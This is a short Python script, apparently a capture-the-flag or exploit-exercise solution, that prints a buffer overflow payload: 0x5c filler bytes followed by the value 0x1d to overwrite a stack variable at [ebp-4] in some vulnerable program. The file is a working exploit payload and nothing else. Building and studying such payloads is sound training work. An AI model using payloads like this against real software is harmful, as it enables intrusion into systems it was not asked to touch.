#!/usr/bin/env python

offset = 0x60 - 0x4

# dword [ebp-4]  == 0x1d (0000001d => '\x1d\x00\x00\x00')
payload = offset * 'a' + '\x1d\x00\x00\x00'
print(payload)

